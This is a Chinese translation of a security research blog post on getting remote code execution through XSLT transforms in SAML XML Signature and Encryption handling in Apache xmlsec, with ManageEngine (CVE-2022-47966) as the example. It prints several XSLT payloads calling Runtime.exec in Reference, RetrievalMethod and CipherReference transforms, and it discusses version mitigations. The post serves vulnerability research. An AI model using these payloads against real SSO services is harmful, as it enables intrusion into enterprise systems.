本文为翻译稿件，原文：<https://blog.viettelcybersecurity.com/saml-show-stopper/> 。  
![](./img/2004578384371056504.png)

  * 简介  
SAML（安全断言标记语言）和 OIDC（OpenID Connect）是两个主要的SSO（单点登录）标准。
OIDC使用率更广SAML主要用于企业组织对员工的身份验证。SAML依靠XMLSignature和XMLEncryption来检查消息是否来自身份提供者(IdP)。  
XMLSignature和XMLEncryption design 有很多功能，但也伴随着更多的风险。阅读博客
<https://blog.tint0.com/2021/09/pinging-xmlsec.html> 后，我产生了一些疑问并决定继续深入研究一下。  
xmlsec (Apache Santuario)
有很多漏洞记录，它们被低估的程度令人惊讶，例如HMAC截断、弱规范化算法、secureValidation
错误处理……最近，ManageEngine在公告<https://www.manageengine.com/security/advisory/CVE/cve-2022-47966.html>
发布了由于使用旧版本的xmlsec而被漏洞利用的记录。在这篇博客中，将讨论检查 XML 签名、解密 XML时的转换风险。 如果您已经研究过
xmlsec，则可以跳到第 4 部分。  
![](./img/6401151277874978935.png)

  * XSLT转换函数  
XML Signature Syntax and Processing desin有一个功能可以执行执行 XSLT
转换：<https://www.w3.org/TR/2013/REC-xmldsig-core1-20130411/#sec-XSLT。>  
此设计用于签名和验证过程。这意味着我们可以在签名中制作一个带有 XSLT 转换的
SAMLResponse，当服务器检查签名时，样式表也会被一起处理。下面演示xmlsec是如何实现的，通过打断点来查看堆栈跟踪。  
在老版本的xmlsec中，当检查 XMLSignature 时，会首先检查 SignedInfo：  
![](./img/5288363463065029886.png)  
检查 SignedInfo 的过程是 verify设置：  
![](./img/1056801518024912240.png)  
需要我们注意的是这里没有直接引用 URI，而是进行转换了。  
![](./img/3919157016080887465.png)  
获取到spi 后再对输入的数据进行转换。  
![](./img/6629711192002451620.png)  
W3有一些转换算法，最具危险性的是XSLT转换（<http://www.w3.org/TR/1999/REC-xslt-19991116）> 。  
![](./img/6921278209802778439.png)  
用户输入的 XSLT 转换可能导致代码执行，需要检查XSLT RCE 的所有payload。下面是我们设计的签名文件:

    
        <ds:Signature
      xmlns:ds="http://www.w3.org/2000/09/xmldsig#">
      <ds:SignedInfo>
          <ds:CanonicalizationMethod Algorithm="http://www.w3.org/2001/10/xml-exc-c14n#"/>
          <ds:SignatureMethod Algorithm="http://www.w3.org/2000/09/xmldsig#hmac-sha1">
              <ds:HMACOutputLength>1</ds:HMACOutputLength>
          </ds:SignatureMethod>
          <ds:Reference URI="#pfx2d9362ee-a4ec-13c8-3151-65f533ef4416">
              <ds:Transforms>
                  <ds:Transform Algorithm="http://www.w3.org/TR/1999/REC-xslt-19991116">
                      <xsl:stylesheet version="1.0"
                          xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
                          xmlns:rt="http://xml.apache.org/xalan/java/java.lang.Runtime"
                          xmlns:ob="http://xml.apache.org/xalan/java/java.lang.Object">
                          <xsl:template match="/">
                              <xsl:variable name="rtobject" select="rt:getRuntime()"/>
                              <xsl:variable name="process" select="rt:exec($rtobject,'calc')"/>
                              <xsl:variable name="processString" select="ob:toString($process)"/>
                              <xsl:value-of select="$processString"/>
                          </xsl:template>
                      </xsl:stylesheet>
                  </ds:Transform>
                  <ds:Transform Algorithm="http://www.w3.org/2001/10/xml-exc-c14n#"/>
              </ds:Transforms>
              <ds:DigestMethod Algorithm="http://www.w3.org/2000/09/xmldsig#sha1"/>
              <ds:DigestValue>/KjOCTrjp+RcRcbirgX6HysSfhM=</ds:DigestValue>
          </ds:Reference>
      </ds:SignedInfo>
      <ds:SignatureValue>AAAAAA</ds:SignatureValue>
    </ds:Signature>

可以访问 <https://developers.onelogin.com/saml/examples/response> 获取已签名的
SAMLResponse 示例，并根据需要进行修改。  
在 SAMLResponse 中对受影响的 ManageEngine ServiceDesk 使用此签名，就能执行RCE。 （如果是在 Windows
上运行，请检查进程，它不会弹出任何计算器 :D）。  
这样的话也太简单了，但我还没有看到任何关于签名检查导致 RCE 的 CVE ，这真的很奇怪。这就是全部吗？ Burp 就有插件可以测试 SAML（SAML
Raider），那还有必要阅读这篇博客吗？

  * 难点  
正如我之前提到的，简单的 XSLT 转换只发生在旧版本的 xmlsec 中。 ManageEngine 也确实在他们的产品中使用了各种各样的xmlsec
版本（他们可能在开发每个产品时使用的是最新版本？）  
有关更多详细信息，在 xmlsec 1.4.2 及以上版本中，XMLSignature 将在检查签名信息之前使用签名算法检查签名值。  
![](./img/3570102226865310063.png)  
这意味着如果我们按照以前的原理来，可能导致授权错误。  
别担心，还有更多地方会进行转换。  
w3 中的 RetrievalMethod 元素部分（<https://www.w3.org/TR/2013/REC-xmldsig-core1-20130411/#sec-RetrievalMethod）> 提到：“KeyInfoReference 元素使用场景多于
RetrievalMethod，因为它可以避免转换子元素时引入安全风险”。 也就是 KeyInfo 的 RetrievalMethod
在签名值检查之前就执行转换。  
下面是RetrievalMethodResolver.resolveInput() 的 xmlsec 转换过程：  
![](./img/5043779189957623686.png)  
为了增强安全性，自 xmlsec 1.5.0 以来，Apache 团队为防止转换风险添加了安全验证属性，但默认未启用。 在 xmlsec < 2.2.3 &
2.1.7 中也可以使用 KeyInfoReference 绕过此验证（可查看 tint0 的博客：
<https://blog.tint0.com/2021/09/pinging-xmlsec.html）> ，因此我们可以暂时忽略这一点。  
我们的 KeyInfo 元素如下：

    
        <ds:KeyInfo
      xmlns:ds="http://www.w3.org/2000/09/xmldsig#">
      <ds:RetrievalMethod URI="file:/some/important/secret.xml">
          <ds:Transforms>
              <ds:Transform Algorithm="http://www.w3.org/TR/1999/REC-xslt-19991116">
                  <xsl:stylesheet version="1.0"
                      xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
                      xmlns:rt="http://xml.apache.org/xalan/java/java.lang.Runtime"
                      xmlns:ob="http://xml.apache.org/xalan/java/java.lang.Object">
                      <xsl:template match="/">
                          <xsl:variable name="rtobject" select="rt:getRuntime()"/>
                          <xsl:variable name="process" select="rt:exec($rtobject,'calc')"/>
                          <xsl:variable name="processString" select="ob:toString($process)"/>
                          <xsl:value-of select="$processString"/>
                      </xsl:template>
                  </xsl:stylesheet>
              </ds:Transform>
          </ds:Transforms>
      </ds:RetrievalMethod>
    </ds:KeyInfo>

但并不是所有的SAML认证过程都可以通过RCE获取KeyInfo，有些会使用预先配置的密钥，我们必须另辟蹊径。  
还记得 XML 加密吗？ 可参考w3 design（<https://www.w3.org/TR/2002/REC-xmlenc-core-20021210/Overview.html）> 。 CipherReference 和 ReferenceList 元素会进行转换。 XML
Encryption 也有 EncryptedKey 元素，里面会有 KeyInfo 元素，我们可以再次利用我们前面的工作。  
XMLCipherInput.getDecryptBytes() 中的 xmlsec 执行转换功能：  
![](./img/3028443049661173363.png)  
CipherData 如下：

    
        <xenc:CipherData>
      <xenc:CipherReference URI="#_8e8dc5f69a98cc4c1ff3427e5ce34606fd672f91e6">
          <xenc:Transforms>
              <dsig:Transforms>
                  <dsig:Transform Algorithm="http://www.w3.org/TR/1999/REC-xslt-19991116">
                      <xsl:stylesheet version="1.0"
                          xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
                          xmlns:rt="http://xml.apache.org/xalan/java/java.lang.Runtime"
                          xmlns:ob="http://xml.apache.org/xalan/java/java.lang.Object">
                          <xsl:template match="/">
                              <xsl:variable name="rtobject" select="rt:getRuntime()"/>
                              <xsl:variable name="process" select="rt:exec($rtobject,'calc')"/>
                              <xsl:variable name="processString" select="ob:toString($process)"/>
                              <xsl:value-of select="$processString"/>
                          </xsl:template>
                      </xsl:stylesheet>
                  </dsig:Transform>
              </dsig:Transforms>
          </xenc:Transforms>
      </xenc:CipherReference>
    </xenc:CipherData>

您可以访问 <https://developers.onelogin.com/saml/examples/response> 以获取加密的
SAMLResponse 示例并根据需要进行修改。  
为了更容易记住这一点，我制作了表格，记录了恶意转换（如果有问题，请随时纠正我）：  
![](./img/413308107844428712.png)  
但是……  
![](./img/1029586324038714573.png)  
在这些位置进行transform真的能得到RCE吗？

  * 真正的难点  
从 xmlsec 1.4.2 开始，Apache 团队在执行 XSLT 转换时启用了安全处理功能：  
![](./img/8646240228958937712.png)  
这使我们无法使用任何 Xalan 的扩展，这意味着以前的样式表将不再起作用。 XPath 和 XSLT 转换中留下的最危险的函数是 document()
，但它只能读取有效的 XML 文件和 http get 请求。 这就是为什么 tint0 找到了读取 xml 文件的方法。 但并非所有应用程序存储在 xml
文件中，并且此处的H http 请求没有任何意义。 我们必须找到一种方法来绕过它。  
幸运的是，最近有一个整数截断错误可以帮助我们绕过此功能， CVE-2022-34169
（<https://bugs.chromium.org/p/project-zero/issues/detail?id=2290）> 来自 @_fel1x
的贡献。  
但也没那么幸运，我尝试过但失败了。 起初，我以为 ManageEngine
限制每个请求的字符数为40000，如果我们能绕过这个限制，我们就可以到达远程代码的梦想之地。 在深入研究 CVE-2022-34169
一段时间后，我发现就算我们绕过了限制，也仍然无法执行代码。  
Xalan 整数截断错误发生在 XSLTC 编译过程中，XSLTC 是 JDK 中的默认编译器，是 JDK 中的默认编译器，但不是 Xalan。
如果类路径中有 xalan 库，则默认的 TransformerFactory 将为
`org.apache.xalan.processor.TransformerFactoryImpl`，因此当 xalan 库存在时，样式表不会使用
XSLTC，而交给 XSLTElementProcessors 处理，可在默认位置META-INF 中查看
`TransformerFactory.newInstance()`代码。  
![](./img/2118210793614152479.png)  
有希望，然后希望消失了，我马上就要习惯了

